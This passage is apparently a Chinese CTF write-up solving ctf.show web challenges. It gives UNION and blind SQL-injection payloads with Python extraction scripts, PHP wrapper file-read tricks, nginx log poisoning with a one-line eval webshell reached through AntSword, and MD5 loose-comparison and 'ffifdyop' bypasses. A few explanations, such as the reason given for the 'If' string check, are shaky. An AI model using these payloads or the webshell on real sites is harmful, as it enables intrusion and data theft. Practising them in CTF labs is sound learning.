个数<imgsrc="https://s2.loli.net/2023/02/13/ZyDW28pbmilUJIS.png"alt="image-20230213161043948" /><imgsrc="https://s2.loli.net/2023/02/13/H8aPiVwuM97Odb2.png"alt="image-20230213161014100" /></p></li><li><p>回显位置（数据库名<imgsrc="https://s2.loli.net/2023/02/13/9ju4Mf7DtA3Tqk8.png"alt="image-20230213160026269" /></p></li><li><p>爆数据库</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">username=admin' or 1=1 union <span class="token function">select</span> 1<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span>3 <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token comment"># &amp;password=123456</span> <span class="token string">"union"</span>: 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。<span class="token string">"select"</span>: 这是SQL语言中的一个关键字，表示从数据库中选择数据。<span class="token string">"1"</span>: 这是一个常量值，代表一个整数。<span class="token string">"group_concat"</span>: 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。<span class="token string">"schema_name"</span>: 这是<span class="token string">"information_schema.schemata"</span>表中的一列，代表数据库名称。<span class="token string">"information_schema.schemata"</span>: 这是MySQL数据库中的一个系统数据库表，包含数据库信息。<span class="token string">"3"</span>: 这是一个常量值，代表一个整数</code></pre><figure><img src="https://s2.loli.net/2023/02/13/b65mzrB2wUW9MHc.png"alt="image-20230213181032739" /><figcaption aria-hidden="true">image-20230213181032739</figcaption></figure></li><li><p>爆表</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">username=admin' or 1=1 union <span class="token function">select</span> 1<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span>3 <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables <span class="token comment"># &amp;password=123456</span></code></pre><figure><img src="https://s2.loli.net/2023/02/13/RvZwiqalHCVrX3D.png"alt="image-20230213181732271" /><figcaption aria-hidden="true">image-20230213181732271</figcaption></figure></li><li><p>指定数据库的爆表</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">username=admin' or 1=1 union <span class="token function">select</span> 1<span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span>3 <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema=<span class="token string">"web2"</span> <span class="token comment"># &amp;password=123456</span></code></pre><figure><img src="https://s2.loli.net/2023/02/13/nFGV8KBTd71gPx5.png"alt="image-20230213182835819" /><figcaption aria-hidden="true">image-20230213182835819</figcaption></figure></li><li><p>爆列</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">username=admin<span class="token string">' or 1=1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name ='</span>flag<span class="token string">' and table_schema='</span>web2'  <span class="token comment"># &amp;password=123456</span></code></pre><figure><img src="https://s2.loli.net/2023/02/13/FpKWRagnsd3wZtQ.png"alt="image-20230213184817127" /><figcaption aria-hidden="true">image-20230213184817127</figcaption></figure></li><li><p>flag</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">username=admin' or 1=1 union <span class="token function">select</span> 1<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>3 <span class="token keyword">from</span> flag <span class="token comment"># &amp;password=123456</span></code></pre><figure><img src="https://s2.loli.net/2023/02/13/xk7rV4TYGHUoNLf.png"alt="image-20230213185026341" /><figcaption aria-hidden="true">image-20230213185026341</figcaption></figure></li></ul><h4 id="web3-php-伪协议利用-伪协议">web3: php 伪协议利用 <ahref="https://bbs.huaweicloud.com/blogs/319031">伪协议</a></h4><ul><li><p><code>POST</code>请求务必要加媒体类型信息：<code>Content-Type: application/x-www-form-urlencoded</code></p><p>在 HTTP 协议中，HTTP 请求分为多种类型，其中包括<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>等。其中，<code>POST</code>请求通常用于向服务器提交数据，如表单数据、上传文件等。而 HTTP请求还可以携带额外的请求头信息，比如 <code>Content-Type</code>请求头，用于指定请求体的媒体类型。</p><p><code>Content-Type: application/x-www-form-urlencoded</code>是指发送的数据格式为 URL编码表单数据。在使用此格式的请求中，请求体中的数据会以类似 URL查询字符串的形式进行编码，比如<code>key1=value1&amp;key2=value2</code>。</p><p>对于 <code>POST</code> 请求而言，如果不加上<code>Content-Type: application/x-www-form-urlencoded</code>这个请求头，服务器就无法正确解析请求体中的数据，因为服务器不知道这些数据是以何种格式进行编码的。加上这个请求头之后，服务器就可以根据请求头中的<code>Content-Type</code> 字段来判断请求体的格式，并进行相应的解析。</p><p>因此，当使用 <code>POST</code> 请求提交表单数据时，一般需要加上<code>Content-Type: application/x-www-form-urlencoded</code>这个请求头，以确保服务器能够正确地解析请求体中的数据。</p></li><li><p>burp 抓包<imgsrc="https://s2.loli.net/2023/02/13/vYibEtfByMQHr9e.png"alt="image-20230213221624031" /></p></li><li><p><code>php://filter</code>: 读取文件源码</p><ul><li>编码后的文件内容不会被执行,而是展示在页面中</li></ul><pre class="language-powershell" data-language="powershell"><code class="language-powershell">http:<span class="token operator">/</span><span class="token operator">/</span>19fd689a-f81b-4418-8ea2-ddc142465b1c<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show/?url=php:<span class="token operator">/</span><span class="token operator">/</span><span class="token keyword">filter</span><span class="token operator">/</span>read=convert<span class="token punctuation">.</span>base64-encode/resource=index<span class="token punctuation">.</span>php</code></pre><figure><img src="https://s2.loli.net/2023/02/13/WbtGQMyipwcDfqs.png"alt="image-20230213223316936" /><figcaption aria-hidden="true">image-20230213223316936</figcaption></figure></li><li><p><code>php: //input</code>:可以访问请求的<strong>原始数据</strong>,配合文件包含漏洞可以将post请求体中的内容当做<strong>文件内容执行</strong>,从而实现<strong>任意代码执行</strong>(注意命令务必拼写正确)<imgsrc="https://s2.loli.net/2023/02/13/48RInJuTbQlkeHL.png"alt="image-20230213225411586" /></p></li><li><p>再读一个文件<imgsrc="https://s2.loli.net/2023/02/13/YHnLdFa3z7eNVfx.png"alt="image-20230213225547578" /></p></li><li><p>解码<img src="https://s2.loli.net/2023/02/13/w7rav5D43l1FumN.png"alt="image-20230213225641220" /></p></li></ul><h4 id="web4php伪协议">web4:<code>php伪协议</code></h4><ul><li><p>尝试web3解法<imgsrc="https://s2.loli.net/2023/02/13/JjwlxIiEOr9equM.png"alt="image-20230213231912421" /></p></li><li><p>报错：联想日志</p><ul><li><p>日志文件默认路径</p><ul><li><strong>/var/log/nginx/access.log</strong></li><li><strong>/var/log/nginx/error.log</strong></li></ul></li><li><p>访问日志<imgsrc="https://s2.loli.net/2023/02/13/e2sUuNjaX6FyMtq.png"alt="image-20230213232507475" /></p></li><li><p>一句话木马</p></li></ul><p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></p><ul><li><p>antSword安装<imgsrc="https://s2.loli.net/2023/02/13/VdpsDgC98tbNi5F.png"alt="image-20230213235512722" /></p></li><li><p>往日志写入木马</p></li><li><figure><img src="https://s2.loli.net/2023/02/14/ArY9X3oqbulVB5T.png"alt="image-20230214002045185" /><figcaption aria-hidden="true">image-20230214002045185</figcaption></figure></li><li><p>蚁剑连接</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">URL地址：http:<span class="token operator">/</span><span class="token operator">/</span>c3520b57-6be4-4a9d-87c9-b97780c4dc9f<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show/?url=<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/nginx/access<span class="token punctuation">.</span>log</code></pre><figure><img src="https://s2.loli.net/2023/02/14/OvR4Pu3infYBFMG.png"alt="image-20230214002211635" /><figcaption aria-hidden="true">image-20230214002211635</figcaption></figure><ul><li>寻找flag<imgsrc="https://s2.loli.net/2023/02/14/N3EAJkWubcOUgfV.png"alt="image-20230214002748134" /></li></ul></li></ul></li></ul><h4 id="web5md5绕过image-20230224013307979">web5（Md5绕过）<imgsrc="https://s2.loli.net/2023/02/24/D4cHsIlnwoBGeSr.png"alt="image-20230224013307979" /></h4><ul><li><p>代码解释</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php：这是 <span class="token constant">PHP</span> 代码的起始标记，它告诉 <span class="token constant">PHP</span> 解释器该文件包含 <span class="token constant">PHP</span> 代码。 <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span>：这创建了一个名为 <span class="token variable">$flag</span> 的变量，并将其初始值设置为空字符串。 <span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span>：这将 <span class="token constant">GET</span> 请求中的 v1 参数的值赋给变量 <span class="token variable">$v1</span>。 <span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span>：这将 <span class="token constant">GET</span> 请求中的 v2 参数的值赋给变量 <span class="token variable">$v2</span>。 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>：这个条件语句检查变量 <span class="token variable">$v1</span> 和 <span class="token variable">$v2</span> 是否都已经设置，如果是则执行条件语句块中的代码。 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>：这个条件语句检查 <span class="token variable">$v1</span> 变量中是否只包含字母，如果不是，执行条件语句块中的代码，输出 <span class="token string double-quoted-string">"v1 error"</span> 并终止脚本的执行。 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>：这个条件语句检查 <span class="token variable">$v2</span> 变量是否是一个数字，如果不是，执行条件语句块中的代码，输出 <span class="token string double-quoted-string">"v2 error"</span> 并终止脚本的执行。 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>：这个条件语句检查 <span class="token variable">$v1</span> 和 <span class="token variable">$v2</span> 的 md5 哈希值是否相同，如果是，执行条件语句块中的代码，输出 <span class="token variable">$flag</span> 变量的值。 <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>：这个语句将 <span class="token variable">$flag</span> 变量的值输出到客户端。 <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>：如果 <span class="token keyword">if</span> 语句中的条件没有被满足，执行这个 <span class="token keyword">else</span> 语句块中的代码。 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"where is flag?"</span><span class="token punctuation">;</span>：这个语句输出 <span class="token string double-quoted-string">"where is flag?"</span>，表示在缺少 <span class="token constant">GET</span> 请求参数的情况下无法找到 flag 值。 <span class="token delimiter important">?></span></span>：这是 PHP 代码的结束标记，告诉 PHP 解释器该文件的 PHP 代码部分已经结束。</code></pre></li><li><p>answer</p></li></ul><pre class="language-powershell" data-language="powershell"><code class="language-powershell">http:<span class="token operator">/</span><span class="token operator">/</span>e0e32665-ecd3-4333-b7b4-0d6c57e14d57<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show/?v1=QNKCDZO&amp;v2=240610708</code></pre><figure><img src="https://s2.loli.net/2023/02/24/45hF9dq87cpfzDV.png"alt="image-20230224021331961" /><figcaption aria-hidden="true">image-20230224021331961</figcaption></figure><ul><li>原理<ul><li>loose type comparison operator (==) that can treat two differentstrings as equal if they have a certain format</li><li>For example, “1234e03” == “1234000” is true in PHP because bothstrings are interpreted as numbers in scientific notation4</li><li>For example, md5(“240610708”) == md5(“QLTHNDT”) is true in PHPbecause both hashes start with “0e” followed by digits<ul><li>“0e123” == “0e456” is also true in PHP because both strings areinterpreted as zero times some power of ten.</li></ul></li></ul></li></ul><h4 id="web6sql注入空格绕过">Web6：sql注入（空格绕过）</h4><ul><li><p>页面<img src="https://s2.loli.net/2023/02/25/QtruVIXhqz2R9if.png"alt="image-20230225104806734" /></p></li><li><p>表单<img src="https://s2.loli.net/2023/02/25/X5ak7DRAqsKVTxU.png"alt="image-20230225105038312" /></p></li><li><p>sql注入</p><figure><img src="https://s2.loli.net/2023/02/25/WvULqfVondwGrut.png"alt="image-20230225105104252" /><figcaption aria-hidden="true">image-20230225105104252</figcaption></figure><figure><img src="https://s2.loli.net/2023/02/25/U4QmcNSGstJopKX.png"alt="image-20230225110632732" /><figcaption aria-hidden="true">image-20230225110632732</figcaption></figure></li><li><p>考虑</p><ul><li>关键字过滤</li></ul></li><li><p>空格过滤</p><p><code>SQL</code>注入是一种利用Web应用程序对用户输入的数据没有进行充分过滤，从而构造恶意的SQL语句执行攻击者想要的操作的技术³。</p><p>关键字过滤是指Web应用程序对用户输入的数据进行检查，如果发现包含了一些敏感的SQL关键字，如<code>union、select、drop</code>等，就拒绝执行或者删除这些关键字¹。</p><p>空格过滤是指Web应用程序对用户输入的数据进行检查，如果发现包含了空格字符，就拒绝执行或者删除空格字符。这是因为一些SQL语句需要使用空格来分隔不同的部分²。</p><p>绕过关键字过滤和空格过滤的方法有很多，比如使用<strong>SQL注释符号</strong>（//）、使用<strong>十六进制编码</strong>（0x）、使用<strong>内置函数</strong>（char()）等¹⁴。具体的方法要根据不同的数据库和情况来选择。</p><ul><li>注释绕过空格过滤<imgsrc="https://s2.loli.net/2023/02/25/xfWPh5tCpSzwUKM.png"alt="image-20230225110536023" /></li></ul></li><li><p>表名<img src="https://s2.loli.net/2023/02/25/CpaKwB2MLfDqFvm.png"alt="image-20230225111301288" /></p></li><li><p>列名<img src="https://s2.loli.net/2023/02/25/cAhi46SkJq2tzKs.png"alt="image-20230225111352899" /></p></li><li><p>flag<img src="https://s2.loli.net/2023/02/25/RX8anbUe34ohzwL.png"alt="image-20230225111446970" /></p></li></ul><h4 id="web7-py注入脚本">Web7： Py注入脚本</h4><ul><li><p>点开一篇文章 观察地址栏 有参数id</p><ul><li><p>payload</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">id=1<span class="token punctuation">|</span><span class="token punctuation">|</span>1</code></pre></li><li><p>会显示所有文章：可sql注入</p></li></ul></li><li><p>接下来就是常规操作</p><ul><li><p>爆库，爆表，爆裂</p></li><li><p>脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestss<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">'http://376f6454-37f5-47df-aa98-bfd375f0f8d9.challenge.ctf.show/index.php'</span>table<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#爆表名  flag</span>        payload <span class="token operator">=</span> <span class="token string">"ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#"</span><span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#爆字段名 flag</span>        <span class="token comment">#payload = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))</span>        <span class="token comment">#读取flag</span>        <span class="token comment">#payload = "ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#"%(str(i), str(j))</span>        ra <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url <span class="token operator">+</span> <span class="token string">'?id=0/**/or/**/'</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> ra<span class="token punctuation">:</span>            table <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre></li><li><p>运行情况<imgsrc="https://s2.loli.net/2023/02/26/5aFurQvdiW6fpO3.png"alt="image-20230226235929980" /></p></li></ul></li><li><p>换个脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://124.156.121.112:28069/?id=-1'/**/"</span><span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 爆库名</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            u <span class="token operator">=</span> <span class="token string">"or/**/ascii(substr(database()/**/from/**/"</span> <span class="token operator">+</span> \                <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/**/for/**/1))="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"#"</span>            s <span class="token operator">=</span> url<span class="token operator">+</span>u            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'By Rudyard Kipling'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 爆表名</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        table_name <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                u <span class="token operator">=</span> <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token string">"||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>                    i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">")/**/from/**/"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/**/for/**/1))="</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"#"</span>                s <span class="token operator">=</span> url<span class="token operator">+</span>u                <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">'By Rudyard Kipling'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                    table_name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    table<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>没成功，这个响应报文的字符串为什么是用程序中那个，我的运行，没有打印出数据库名的任何一个字符。</li></ul></li></ul><h4 id="web8-py注入脚本">Web8： Py注入脚本</h4><ul><li><p>单引号、空格被过滤，出现<strong>sql injecterror</strong>；逗号（在函数中间隔参数）也被过滤：可以使用特殊语法绕过,比如:<code>substr(database(),1,1)</code>可以用<code>substr(database() from 1 for 1)</code>来代替</p></li><li><p>有回显：爆出全部文章<imgsrc="https://s2.loli.net/2023/02/28/I68TAYmO7pvVHyW.png"alt="image-20230228113555016" /></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests url <span class="token operator">=</span> <span class="token string">'http://d664d69e-0da3-45b0-9170-12b4af6cfca9.challenge.ctf.show/index.php?id=-1/**/or/**/'</span>name <span class="token operator">=</span> <span class="token string">''</span> <span class="token comment"># 循环45次( 循环次数按照返回的字符串长度自定义)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 获取当前使用的数据库</span>    <span class="token comment"># payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'</span>    <span class="token comment"># 获取当前数据库的所有表</span>    <span class="token comment"># payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'</span>    <span class="token comment"># 获取flag表的字段</span>    <span class="token comment"># payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'</span>    <span class="token comment"># 获取flag表的数据</span>    payload <span class="token operator">=</span> <span class="token string">'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'正在获取第 %d 个字符'</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>    <span class="token comment"># 截取SQL查询结果的每个字符, 并判断字符内容</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> <span class="token string">'If'</span> <span class="token keyword">in</span> result<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            name <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据库名/表名/字段名/数据: %s'</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>            <span class="token keyword">break</span>         <span class="token comment"># 如果某个字符不存在,则停止程序</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> count <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token number">128</span> <span class="token operator">-</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>Code解析</strong>：</p><ul><li><p>ASCII码表中的<strong>可打印字符</strong>位于31到127之间</p></li><li><p><code>payload % (i, j)</code> 是将字符串 <code>payload</code>中的 <code>%d</code> 占位符分别替换为 <code>(i, j)</code>，即第一个<code>%d</code> 替换为 <code>i</code>，第二个 <code>%d</code> 替换为<code>j</code>。这种字符串占位符的用法通常用于将一个字符串模板与一些数据结合生成新的字符串。在这个例子中，<code>payload</code>是一个用于构造 SQL 注入攻击的字符串模板，其中 <code>%d</code>表示一个整数占位符。在程序中，<code>payload % (i, j)</code>的实际效果是将 <code>payload</code> 中的 <code>%d</code>分别替换为当前循环的 <code>i</code> 和 <code>j</code>值。这样就能够构造出不同的 SQL 查询，用于获取不同的数据库信息。</p></li><li><p>这是因为脚本作者在进行 SQL注入漏洞检测时，使用了一个特殊的判断条件，即查询结果中是否包含字符串<strong>"If"</strong>。这个判断条件是根据漏洞返回的响应结果的特点而设定的。在这个特定的情况下，如果SQL 查询语句执行成功，那么返回的响应结果中会包含一个 <em>HTTP</em>响应头，其中包含一个 "If"字符串，因此脚本作者就使用这个字符串作为判断条件来判断 SQL注入漏洞是否存在。实际上，判断条件可以是任何特定于目标网站和漏洞的字符串，只要在漏洞存在时该字符串能够出现在响应结果中即可。</p></li></ul><p><strong>执行过程：</strong><imgsrc="https://s2.loli.net/2023/05/14/fW8EaUI5yri7HBG.png"alt="image-20230514233401671" /></p></li></ul><h4 id="web9-代码审计">Web9 : 代码审计</h4><ul><li><p><strong>keywords</strong></p><p>目录扫描</p><p>MD5</p><p>万能密码</p></li></ul><ol type="1"><li><strong>dirsearch</strong> ：<ahref="https://github.com/maurosoria/dirsearch#wordlists-important">目录扫描工具安装</a></li></ol><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>. Install with git: <span class="token function">git</span> clone https://github.com/maurosoria/dirsearch.git <span class="token parameter variable">--depth</span> <span class="token number">1</span> <span class="token punctuation">(</span>RECOMMENDED<span class="token punctuation">)</span><span class="token number">2</span>. <span class="token builtin class-name">cd</span> dirsearch </code></pre><ol start="2" type="1"><li><p>扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">3</span>. dirsearch <span class="token parameter variable">-u</span> http://4773abe8-15a4-4d51-b0f1-d0c4b64b55ba.challenge.ctf.show/</code></pre><p><strong>扫描结果</strong>：<imgsrc="https://s2.loli.net/2023/05/15/SinHDeGdMIUVx9j.png"alt="image-20230515011856443" />这是一个 <code>robots.txt</code>文件的内容，该文件告诉网络爬虫哪些页面可以被访问，哪些页面不能被访问。其中，<code>User-agent: *</code>表示适用于所有网络爬虫，<code>Disallow: /index.phps</code>表示禁止访问以 /index.phps结尾的所有页面。这个规则意味着，任何网络爬虫都无法访问名为 index.phps的页面，这个页面可能包含<strong>敏感信息或者漏洞</strong>，不希望被黑客利用。注意，robots.txt只是一种建议性的协议，遵循这个协议的网络爬虫不会访问被禁止的页面，但不遵循这个协议的网络爬虫仍然可以访问。因此，robots.txt不能作为安全措施来保护网站，只能用来控制搜索引擎爬虫的行为。</p></li><li><p><strong>Final</strong>:</p></li></ol><blockquote><p>根据网上的大佬们得出一个万能密码 <strong>ffifdyop</strong>转换为MD5就是 转换为字符串为：’ ’ ‘or’ 6</p></blockquote><p><strong>原理：</strong></p><blockquote><p><code>ffifdyop</code> 这个字符串被 md5 哈希了之后会变成<code>276f722736c95d99e921722cf9ed621c</code>，这个字符串前几位刚好是 '<code>or '6</code> 而 Mysql 刚好又会把 hex 转成 ascii解释，因此拼接之后的形式是<code>select * from 'admin' where password='' or '6xxxxx'</code>，等价于or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p></blockquote><h4 id="web10-代码审计">Web10： 代码审计</h4><ol type="1"><li><p><code>$regex = 